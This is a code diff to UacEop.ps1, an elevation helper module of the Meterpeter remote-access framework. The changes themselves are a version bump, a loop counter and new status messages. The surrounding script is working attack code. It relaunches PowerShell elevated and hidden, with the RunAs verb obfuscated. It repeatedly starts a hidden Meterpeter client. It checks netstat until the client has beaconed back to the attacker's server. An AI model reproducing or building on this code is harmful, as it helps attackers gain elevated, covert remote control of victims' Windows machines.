@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: netstat
-   PS cmdlet Dev version: v1.0.4
+   PS cmdlet Dev version: v1.0.5
 
 .DESCRIPTION
    Auxiliary module of Meterpeter v2.10.14 that allow users to
@@ -52,11 +52,11 @@
    None. You cannot pipe objects into UacEop.ps1
 
 .OUTPUTS
-   [*] Relaunch console as an elevated process ..
-   [*] Executing meterpeter client [Admin:Comfirm]
-   [*] Waiting connection from server ..
-   [*] Executing meterpeter client [Admin:Comfirm]
-   [-] Connection found, exit loop ..
+   [*] Relaunch console as an elevated process!
+   [1] Executing meterpeter client [Comfirm]
+   [ ] Waiting connection from remote server ..
+   [2] Executing meterpeter client [Comfirm]
+   [-] Remote connection found, exit loop ..
 
 .LINK
    https://github.com/r00t-3xp10it/meterpeter
@@ -108,12 +108,13 @@ If($StartTime -Match '^(\d+\d+:+\d+\d)$')
 }
 
 
+$Counter = 0 ## Set loop function counter to '0'
 $Attacker = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Server:"|Select-Object -First 1) -replace '^(Server: )','')
 $AgentPath = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Client:"|Select-Object -First 1) -replace '^(Client: )','')
 If(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
 {
    $Namelless = "%R@unA@s%" -replace '(@|%)',''
-   write-host "[*] Relaunch console as an elevated process .."
+   write-host "[*] Relaunch console as an elevated process!"
    Start-Process -WindowStyle Hidden powershell "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb $Namelless
    exit
 }
@@ -127,7 +128,7 @@ If($Attacker -match '^(off)$')
       Helper - Execute agent WITHOUT confirm if connection has recived
    #>
 
-   write-host "[*] Executing meterpeter client [Admin:Once]"
+   write-host "[*] Executing meterpeter client [Once]"
    Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $AgentPath"   
 }
 Else
@@ -145,19 +146,20 @@ Else
 
    For(;;)
    {
-      write-host "[*] Executing meterpeter client [Admin:Comfirm]"
+      $Counter = $Counter + 1
+      write-host "[$Counter] Executing meterpeter client [Comfirm]"
       Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $AgentPath"
       Start-Sleep -Seconds 10 ## Give extra time for agent to beacon home
 
       $CheckAgentConnection = (netstat -ano|findstr /C:"ESTABLISHED"|findstr /C:"$Attacker")
       If($CheckAgentConnection -match "$Attacker")
       {
-         write-host "[-] Connection found, exit loop ..`n"
+         write-host "[-] Remote connection found, exit loop ..`n"
          break # Connection found, exit loop
       }
       Else
       {
-         write-host "[*] Waiting connection from server .." -ForegroundColor Yellow
+         write-host "[ ] Waiting connection from remote server .." -ForegroundColor Yellow
       }
    }
 }
